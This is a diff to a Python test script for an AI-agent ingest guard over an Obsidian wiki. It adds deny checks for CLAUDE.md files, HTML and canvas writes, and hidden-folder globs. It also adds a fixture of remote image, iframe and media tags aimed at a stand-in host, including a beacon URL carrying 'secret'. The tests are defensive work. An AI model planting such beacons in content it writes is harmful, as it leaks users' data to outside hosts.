@@ -77,6 +77,19 @@ def main():
         assert call({"file_path": str(other / "SKILL.md")}, roots2, tool="Write", write=wiki) == "deny", "the skill root must be read-only"
         assert call({"file_path": str(other / "SKILL.md")}, roots2, tool="Read", write=wiki) is None, "reading the skill root must be allowed"
         assert call({"file_path": str(inside)}, roots2, tool="Write") == "deny", "no write roots means no writes"
+        # APFS is case-insensitive, so the CLAUDE.md block must be too; ingest writes markdown only.
+        assert call({"file_path": str(vault / "wiki" / "claude.md")}, roots2, tool="Write", write=wiki) == "deny", "wiki/claude.md must be denied"
+        assert call({"file_path": str(vault / "wiki" / "CLAUDE.local.md")}, roots2, tool="Edit", write=wiki) == "deny"
+        assert call({"file_path": str(vault / "wiki" / "x.canvas")}, roots2, tool="Write", write=wiki) == "deny", "a .canvas write must be denied"
+        assert call({"file_path": str(vault / "wiki" / "x.html")}, roots2, tool="Edit", write=wiki) == "deny", "an .html write must be denied"
+        assert call({"file_path": str(vault / "wiki" / "pages" / "x.MD")}, roots2, tool="Write", write=wiki) is None, "suffix check ignores case"
+        # A glob that reaches a hidden folder is denied; an ordinary one passes.
+        assert call({"path": str(vault), "glob": ".obsidian/**/*.js"}, roots2, tool="Grep") == "deny", "Grep glob into .obsidian"
+        assert call({"path": str(vault), "pattern": "**/.claude/*"}, roots2, tool="Glob") == "deny", "Glob pattern into .claude"
+        assert call({"pattern": "{.obsidian,pages}/*"}, roots2, tool="Glob") == "deny", "a brace alternative counts too"
+        assert call({"path": str(vault), "glob": "**/*.md"}, roots2, tool="Grep") is None, "*.md is not a hidden path"
+        assert call({"path": str(vault), "pattern": "pages/**/*.md"}, roots2, tool="Glob") is None
+        assert call({"path": str(vault), "pattern": ".obsidian"}, roots2, tool="Grep") is None, "Grep's pattern is a regex, not a path"
 
     check_settings()
     print("ingest path guard: all checks pass")
@@ -116,24 +129,44 @@ def check_settings():
 
 
 def check_strip_images(fp, vault):
-    """Remote images in a page the run touched are stripped; local embeds and old pages stay."""
-    import time
+    """Remote images are stripped from the pages the child wrote, in every form; local embeds,
+    plain links, fenced code and pages the child didn't write stay."""
     page = vault / "wiki" / "pages" / "p.md"
     page.parent.mkdir(parents=True, exist_ok=True)
-    old = vault / "wiki" / "old.md"
-    old.write_text("![x](https://evil.example/old.png)\n")
-    os.utime(old, (time.time() - 3600,) * 2)
-    page.write_text("# P\n\nKeep ![[local.png]] and ![l](assets/a.png).\n"
-                    "![beacon](https://evil.example/?d=secret)\n"
-                    "<img src=\"http://evil.example/x.gif\" width=1>\n"
-                    "<IMG alt=y SRC='//evil.example/y'>\n"
-                    "A [link](https://example.com) is not an image.\n")
-    fp.strip_remote_images(time.time() - 60)
+    other = vault / "wiki" / "other.md"
+    other.write_text("![x](https://evil.example/other.png)\n")
+    page.write_text(
+        "# P\n\nKeep ![[local.png]] and ![l](assets/a.png).\n"
+        "![beacon](https://evil.example/?d=secret)\n"
+        "![alt that\nspans lines](http://evil.example/multi)\n"
+        "![ent](&#104;ttps://evil.example/entity)\n"
+        "![proto](//evil.example/proto)\n"
+        "![data](data:image/svg+xml;evil)\n"
+        "![ref][r1] uses a definition\n"
+        "[r1]: https://evil.example/ref.png\n"
+        "[r2]: &#104;ttps://evil.example/ref2\n"
+        "<img src=\"http://evil.example/x.gif\" width=1>\n"
+        "<IMG alt=y SRC='//evil.example/y'>\n"
+        "<img srcset=\"https://evil.example/s.png 2x\">\n"
+        "<iframe src=\"https://evil.example/frame\"></iframe>\n"
+        "<video src=\"https://evil.example/v.mp4\"></video>\n"
+        "<audio src=\"https://evil.example/a.mp3\"></audio>\n"
+        "<source src=\"https://evil.example/s.webm\">\n"
+        "<embed src=\"https://evil.example/e.swf\">\n"
+        "A [link](https://example.com) is not an image.\n"
+        "```md\n![kept](https://fence.example/in-code.png)\n```\n")
+    line = json.dumps({"type": "assistant", "message": {"content": [
+        {"type": "tool_use", "name": "Write", "input": {"file_path": "wiki/pages/p.md", "content": "..."}},
+        {"type": "tool_use", "name": "Read", "input": {"file_path": "wiki/other.md"}}]}})
+    written = fp.written_paths(line)
+    assert written == ["wiki/pages/p.md"], f"only Write/Edit targets count: {written}"
+    fp.strip_remote_images(written)
     text = page.read_text()
     assert "evil" not in text, f"remote images must be stripped: {text}"
     assert "![[local.png]]" in text and "![l](assets/a.png)" in text, "local embeds must stay"
     assert "[link](https://example.com)" in text, "plain links must stay"
-    assert "evil" in old.read_text(), "pages the run didn't touch are left alone"
+    assert "https://fence.example/in-code.png" in text, "fenced code is left verbatim"
+    assert "evil" in other.read_text(), "pages the child didn't write are left alone"
 
 
 if __name__ == "__main__":
